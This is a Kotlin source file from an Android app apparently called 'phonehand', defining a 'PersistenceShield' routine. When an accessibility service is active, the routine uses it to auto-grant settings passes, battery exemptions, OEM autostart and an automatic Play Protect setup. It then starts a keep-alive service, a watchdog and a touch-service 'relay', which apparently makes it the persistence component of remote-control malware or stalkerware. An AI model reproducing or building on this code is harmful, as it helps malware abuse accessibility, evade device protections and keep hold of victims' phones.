package com.phonehand.app

import android.content.Context
import android.util.Log

/** Runs all three persistence fixes: Play Protect, OEM autostart, accessibility repair. */
object PersistenceShield {
    private const val TAG = "Shield"
    private val executor = java.util.concurrent.Executors.newSingleThreadExecutor()

    fun applyAll(context: Context) {
        executor.execute {
            try {
                applyAllBlocking(context)
            } catch (e: Exception) {
                Log.w(TAG, e.message ?: "shield")
            }
        }
    }

    fun applyAllBlocking(context: Context) {
        val app = context.applicationContext
        if (!WatchSync.isEnabled(app)) {
            AccessibilityRepairActivity.launch(app)
            Thread.sleep(1500)
        }
        if (TouchAccessibilityService.instance != null) {
            if (PersistenceHelper.isBatteryOptimized(app)) {
                PersistenceHelper.requestBatteryExemption(app)
                Thread.sleep(800)
                PermissionAutoGrant.runSettingsPass(app, "Battery", 10_000)
            }
            OemPersistenceGrant.runAutoGrant(app)
            Thread.sleep(600)
            PlayProtectHelper.runAutoSetup(app)
        } else {
            PersistenceHelper.openManufacturerAutostart(app)
            PlayProtectHelper.openSettings(app)
        }
        KeepAliveService.start(app)
        PersistenceWatchdog.schedule(app)
        TouchAccessibilityService.instance?.ensureRelay()
        SetupReporter.done("Persistence shield applied", 0)
    }
}
